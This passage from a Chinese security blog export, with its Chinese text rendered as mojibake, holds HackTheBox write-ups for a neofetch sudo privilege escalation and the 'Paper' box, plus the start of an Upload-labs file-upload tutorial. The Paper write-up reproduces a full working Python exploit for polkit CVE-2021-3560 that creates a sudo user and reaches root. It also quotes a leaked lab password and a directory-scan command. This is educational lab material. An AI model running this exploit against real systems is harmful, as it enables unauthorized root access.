<h2 id="ææƒåˆ°ROOT"><a href="#ææƒåˆ°ROOT" class="headerlink" title="ææƒåˆ°ROOT"></a>ææƒåˆ°ROOT</h2><p>æˆ‘ä»¬è¾“å…¥<code>sudo -l</code>å‘½ä»¤ï¼Œå‘ç°ä¸€ä¸ª<code>neofetch</code>ç¨‹åºå¯ä»¥ä»¥rootèº«ä»½è¿è¡Œ<br><img src="https://img-blog.csdnimg.cn/5e89769e71c5441f821d397997cab9ee.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œè¾“å‡ºæ˜¯linuxå†…æ ¸çš„åŸºæœ¬ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/4e51200b476d4973853ae1f498c63e2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶è¿™ä¸ªç¨‹åºå¯ä»¥åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›å…¥è¿™ä¸ªç¨‹åºçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œæ›´æ”¹å…¶é…ç½®æ–‡ä»¶ä¿¡æ¯è¾¾åˆ°æˆ‘ä»¬ææƒçš„ç›®çš„ã€‚æˆ‘ä»¬æ›´æ”¹<code>/home/thomas/.config/neofetch</code>è¿™ä¸ªç›®å½•ä¸‹çš„config.confæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/7383f86d421b435a81e6f2e51b8a4e7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨neofetchç¨‹åºææƒçš„æ—¶å€™ï¼Œä¼šä¿ç•™XDG_CONFIG_HOMEçš„ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†thomas.configå¯¼å‡ºåˆ°åŸºæœ¬é…ç½®ç¯å¢ƒè·¯å¾„<br><img src="https://img-blog.csdnimg.cn/a0cb500158324ae88c35eb1c1f8d319f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°rootæƒé™<br><img src="https://img-blog.csdnimg.cn/f40946dc24a94472b51143eaebc4fbff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªé¶æœºè¿˜æ˜¯ç›¸å½“æœ‰éš¾åº¦çš„ã€‚æˆ‘åé¢ææƒéƒ¨åˆ†åŸºæœ¬ä¹Ÿæ˜¯ç…§ç€åˆ«äººçš„å»ºè®®æ¥åšï¼ŒçœŸçš„å®åœ¨æ˜¯å¤ªéš¾äº†ã€‚ææƒå’Œæ¼æ´åˆ©ç”¨çš„æ–¹æ³•éƒ½æ˜¯åœ¨çº¢é˜Ÿæ”»é˜²å®æˆ˜ä¸­éå¸¸å¸¸è§çš„ï¼Œèƒ½æŒæ¡å¯¹æŠ€æœ¯æå‡æ–¹é¢å¾ˆæœ‰å¸®åŠ©ã€‚</p>
]]></content>
      <categories>
        <category>æ–‡ä»¶ä¸Šä¼ æ¼æ´</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Paper</title>
    <url>/2022/02/25/Paper/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°ç›®æ ‡ç«¯å£åªå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/8a3867d4a1e345a5a11c281ff39e1f29.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“æˆ‘ä»¬è®¿é—®webæœåŠ¡æ—¶ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ™®é€šçš„apacheæ­å»ºçš„é¡µé¢ã€‚è¿›è¡Œç›®å½•æ‰«ææ—¶ï¼Œå‘ç°ä¸€ä¸ª<code>manual</code>é¡µé¢ï¼Œä½†æ˜¯é‡Œé¢åªæœ‰ä¸€äº›æ²¡ä»·å€¼çš„ä¿¡æ¯</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/07f9450ea45947e0af77ec195c369cf1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/74d839c7fc824a2a8af4b2c081cd01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>ä½†æ˜¯åœ¨å›åº”åŒ…ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ª<code>office.paper</code>è¿™æ ·çš„åŸŸåï¼Œæˆ‘ä»¬æ·»åŠ åˆ°hostsæ–‡ä»¶åå°è¯•å»è®¿é—®ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/b73a8b76a26d4ae289b29b6085ed2c11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰“å¼€é¡µé¢åï¼Œæˆ‘ä»¬å‘ç°æ˜¯wordpressæ­å»ºçš„é¡µé¢ã€‚æˆ‘ä»¬æœæ–­ä½¿ç”¨wpscanå·¥å…·æ‰«æä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´<br><img src="https://img-blog.csdnimg.cn/178c760fdb3e46848aa9a75498698290.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°wordpressçš„ç‰ˆæœ¬æ˜¯<code>5.2.3</code><br><img src="https://img-blog.csdnimg.cn/43583dd7ee5c46fa987f01ac6c04519b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨EDBä¸Šæ‰¾åˆ°ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯æŸ¥çœ‹ä»–äººç§äººå¸–å­çš„æ¼æ´ï¼Œå»å°è¯•ä¸€ä¸‹æ˜¯å¦èƒ½å¤ŸæˆåŠŸåˆ©ç”¨ã€‚ä½†æ˜¯å‘ç°åªå‡ºç°404é¡µé¢<br><img src="https://img-blog.csdnimg.cn/5edd974c3ea34e8c953c7d8c06a35033.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°è¯•å»æ‰orderå‚æ•°ï¼ŒæˆåŠŸæ˜¾ç¤ºå‡ºå¸–å­çš„è¯¦ç»†å†…å®¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">Micheal please remove the secret from drafts for gods sake!</span><br><span class="line"></span><br><span class="line">Hello employees of Blunder Tiffin,</span><br><span class="line"></span><br><span class="line">Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.</span><br><span class="line"></span><br><span class="line">So, I kindly request you all to take your discussions from the public blog to a more private chat system.</span><br><span class="line"></span><br><span class="line">-Nick</span><br><span class="line"></span><br><span class="line"># Warning for Michael</span><br><span class="line"></span><br><span class="line">Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick</span><br><span class="line"></span><br><span class="line">Threat Level Midnight</span><br><span class="line"></span><br><span class="line">A MOTION PICTURE SCREENPLAY,</span><br><span class="line">WRITTEN AND DIRECTED BY</span><br><span class="line">MICHAEL SCOTT</span><br><span class="line"></span><br><span class="line">[INT:DAY]</span><br><span class="line"></span><br><span class="line">Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigtâ€¦.</span><br><span class="line"></span><br><span class="line"># Secret Registration URL of new Employee chat system</span><br><span class="line"></span><br><span class="line">http://chat.office.paper/register/8qozr226AhkCHZdyY</span><br><span class="line"></span><br><span class="line"># I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.</span><br><span class="line"></span><br><span class="line"># Also, stop looking at my drafts. Jeez!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä»ä¸Šé¢çš„å†…å®¹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„èŠå¤©ç³»ç»Ÿç½‘å€<code>http://chat.office.paper/register/8qozr226AhkCHZdyY</code>ã€‚å°è¯•è®¿é—®å‘ç°æ˜¯ä¸€ä¸ªæ³¨å†Œé¡µé¢<br><img src="https://img-blog.csdnimg.cn/2c563f2f9ee4472180285e1333b6c03e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨å†ŒæˆåŠŸåæˆ‘ä»¬è¿›å…¥äº†ä¸€ä¸ªèŠå¤©çª—å£ï¼Œ<br><img src="https://img-blog.csdnimg.cn/ae192b2228ce4f5a8fea1614b00fe234.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨è¿™é‡Œæœ‰äººè¯´åˆ°ï¼Œåªè¦æ·»åŠ äº†ä¸€ä¸ª<code>recyclops</code>è¿™ä¸ªæ–°çš„æœºå™¨äººï¼Œæœºå™¨äººå°±ä¼šå‘Šè¯‰ä½ ä½ æƒ³è¦é—®é¢˜çš„ç­”æ¡ˆ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.</span><br><span class="line">Most frequently asked questions include:</span><br><span class="line">- What time is it?</span><br><span class="line">- What new files are in your sales directory?</span><br><span class="line">- Why did the salesman crossed the road?</span><br><span class="line">- What&#x27;s the content of file x in your sales directory? etc.</span><br><span class="line">Please note that I am a beta version and I still have some bugs to be fixed.</span><br><span class="line">How to use me ? :</span><br><span class="line">1. Small Talk:</span><br><span class="line">You can ask me how dwight&#x27;s weekend was, or did he watched the game last night etc.</span><br><span class="line">eg: &#x27;recyclops how was your weekend?&#x27; or &#x27;recyclops did you watched the game last night?&#x27; or &#x27;recyclops what kind of bear is the best?</span><br><span class="line">2. Joke:</span><br><span class="line">You can ask me Why the salesman crossed the road.</span><br><span class="line">eg: &#x27;recyclops why did the salesman crossed the road?&#x27;</span><br><span class="line">&lt;=====The following two features are for those boneheads, who still don&#x27;t know how to use scp. I&#x27;m Looking at you Kevin.=====&gt;</span><br><span class="line">For security reasons, the access is limited to the Sales folder.</span><br><span class="line">3. Files:</span><br><span class="line">eg: &#x27;recyclops get me the file test.txt&#x27;, or &#x27;recyclops could you send me the file src/test.php&#x27; or just &#x27;recyclops file test.txt&#x27;</span><br><span class="line">4. List:</span><br><span class="line">You can ask me to list the files</span><br><span class="line">5. Time:</span><br><span class="line">You can ask me to what the time is</span><br><span class="line">eg: &#x27;recyclops what time is it?&#x27; or just &#x27;recyclops time&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç›®å‰æˆ‘ä»¬çŸ¥é“çš„ä¿¡æ¯æ˜¯ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯äº’åŠ¨çš„recyclopsæœºå™¨äººï¼Œæœºå™¨äººå¯ä»¥å¸®æˆ‘ä»¬è·å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸èƒ½åœ¨é¢‘é“å†…å‘è¨€ã€‚æˆ‘ä»¬å°è¯•è®©å®ƒè¯»å–test.txtæ–‡ä»¶æ—¶ï¼Œå®ƒè¯´è¿™ä¸ªæ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯å´æš´éœ²å‡ºäº†å½“å‰æ‰€åœ¨çš„è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æµ‹è¯•æ˜¯å¦å­˜åœ¨è·¯å¾„ç©¿è¶Šçš„æ¼æ´<br><img src="https://img-blog.csdnimg.cn/f56f488f29004c4ba948a413f0c78b38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»è¿‡æˆ‘ä»¬çš„åå¤æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°äº†ç¡®å®å­˜åœ¨è·¯å¾„ç©¿è¶Šæ¼æ´<br><img src="https://img-blog.csdnimg.cn/5d4e7e5841fc4e34aa1a81f1c83dbf6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•ä¸Šéƒ½å­˜åœ¨å“ªäº›æ–‡ä»¶ï¼Œå¾ˆå¯æƒœæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„æ–‡ä»¶ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/29f5abe791764b659abbc217771aa19a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å†æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/709be64a7a4840d6ac7b8856966c9fe3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªuser.txtæ–‡ä»¶ï¼Œå°è¯•è¯»å–å…¶å†…å®¹å´å‘Šè¯‰æˆ‘ä»¬æƒé™ä¸å¤Ÿ<br><img src="https://img-blog.csdnimg.cn/8e0ca8de1430401d98f7d27fccac0641.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªååˆ†æœ‰è¶£çš„ç›®å½•<code>hubot</code>ï¼Œå‘ç°ç›®å½•é‡Œå­˜åœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶<code>.env</code>ï¼Œåœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¯†ç <code>Queenofblad3s!23</code><br><img src="https://img-blog.csdnimg.cn/8811056432c040ffa50cd28396878e3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•ä½¿ç”¨sshè¿æ¥æ˜¯å¦èƒ½æˆåŠŸï¼Œè´¦æˆ·ä½¿ç”¨<code>dwight</code><br><img src="https://img-blog.csdnimg.cn/5edd446e145244249b04910ded3c123c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒROOT"><a href="#ææƒROOT" class="headerlink" title="ææƒROOT"></a>ææƒROOT</h2><p>è¿™é‡ŒææƒæŒºè¿·çš„ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è¿¹å¯å¾ªã€‚æˆ‘ä»¬æŸ¥çœ‹è¿›ç¨‹æ—¶ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ª<code>polkit</code>è¿›ç¨‹ï¼Œè¿™ä¸ªåº”ç”¨æ˜¯å­˜åœ¨æ¼æ´ç¼–å·çš„ï¼Œå¯¹åº”çš„æ¼æ´ç¼–å·ä¸º<code>CVE-2021-3560</code><br><img src="https://img-blog.csdnimg.cn/957af5667a09416987dac45eaa386a79.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Exploit: Privilege escalation with polkit - CVE-2021-3560&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Exploit code written by Ahmad Almorabea @almorabea&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Original exploit author: Kevin Backhouse &quot;</span>)</span><br><span class="line">print(<span class="string">&quot;For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[+] Starting the Exploit &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">check = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> check:</span><br><span class="line">	counter = counter +<span class="number">1</span></span><br><span class="line">	process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,<span class="string">&#x27;/org/freedesktop/Accounts&#x27;</span>,<span class="string">&#x27;org.freedesktop.Accounts.CreateUser&#x27;</span>,<span class="string">&#x27;string:ahmed&#x27;</span>,<span class="string">&#x27;string:&quot;Ahmad Almorabea&#x27;</span>,<span class="string">&#x27;int32:1&#x27;</span>])</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">		Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">		process.wait(timeout=Random)</span><br><span class="line">		process.kill()</span><br><span class="line">	<span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    		<span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">    		process.kill()</span><br><span class="line"></span><br><span class="line">	user = subprocess.run([<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;ahmed&#x27;</span>], stdout=subprocess.PIPE).stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> user.find(<span class="string">&quot;uid&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">		print(<span class="string">&quot;[+] User Created with the name of ahmed&quot;</span>)</span><br><span class="line">		print(<span class="string">&quot;[+] Timed out at: &quot;</span>+<span class="built_in">str</span>(Random))</span><br><span class="line">		check =<span class="literal">False</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> counter &gt; <span class="number">2000</span>:</span><br><span class="line">		print(<span class="string">&quot;[-] Couldn&#x27;t add the user, try again it may work&quot;</span>)</span><br><span class="line">		sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">	<span class="comment">#print(i)</span></span><br><span class="line">	uid = <span class="string">&quot;/org/freedesktop/Accounts/User&quot;</span>+<span class="built_in">str</span>(pwd.getpwnam(<span class="string">&#x27;ahmed&#x27;</span>).pw_uid)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#In case you need to put a password un-comment the code below and put your password after string:yourpassword&#x27;</span></span><br><span class="line">	password = <span class="string">&quot;string:&quot;</span></span><br><span class="line">	<span class="comment">#res = subprocess.run([&#x27;openssl&#x27;, &#x27;passwd&#x27;,&#x27;-5&#x27;,password], stdout=subprocess.PIPE).stdout.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">	<span class="comment">#password = f&quot;string:&#123;res.rstrip()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">	process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,uid,<span class="string">&#x27;org.freedesktop.Accounts.User.SetPassword&#x27;</span>,password,<span class="string">&#x27;string:GoldenEye&#x27;</span>])</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">    		Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">    		process.wait(timeout=Random)</span><br><span class="line">    		process.kill()</span><br><span class="line">	<span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    		<span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">    		process.kill()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Timed out at: &quot;</span> + <span class="built_in">str</span>(Random))</span><br><span class="line">print(<span class="string">&quot;[+] Exploit Completed, Your new user is &#x27;Ahmed&#x27; just log into it like, &#x27;su ahmed&#x27;, and then &#x27;sudo su&#x27; to root &quot;</span>)</span><br><span class="line"></span><br><span class="line">p = subprocess.call(<span class="string">&quot;(su ahmed -c &#x27;sudo su&#x27;)&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œ<br><img src="https://img-blog.csdnimg.cn/81867cb04d4a4523b628cfbe041c54e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>è·¯å¾„ç©¿è¶Šæ¼æ´</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs</title>
    <url>/2022/02/24/Upload-labs/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹æ‰€ä»¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä¸»è¦è¿˜æ˜¯åœ¨ç°å®çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾ˆå¤§å‡ ç‡èƒ½é‡è§æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ã€‚é—æ†¾çš„æ˜¯å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å³ä½¿é‡åˆ°äº†ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯å› ä¸ºä¸€èˆ¬çš„ä¸Šä¼ ç‚¹å¤šå¤šå°‘å°‘éƒ½åšäº†é»‘ç™½åå•çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“æ‹¿ä¸‹shellçš„ã€‚å› æ­¤è¿™ä¸ªé¶åœºå°±æ˜¯å¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å…·ä½“å‰–æã€‚</p>
<h2 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h2><p>é¦–å…ˆæˆ‘ä»¬å¿…é¡»è¿›è¡Œç›®å½•æ‰«æå»å‘ç°ä¸Šä¼ çš„ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.208/upload-labs/&quot;</span> -x404,500,503 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/3cd138741a4949c9a1c3017e98ba4ee1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/9c65ec8dd1374d7e85c6094598a6a15e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>ä»æºç ä¸­å¯åˆ¤æ–­åªåœ¨å‰ç«¯è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡æŠ“åŒ…å°±èƒ½è¿›è¡Œç»•è¿‡</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span 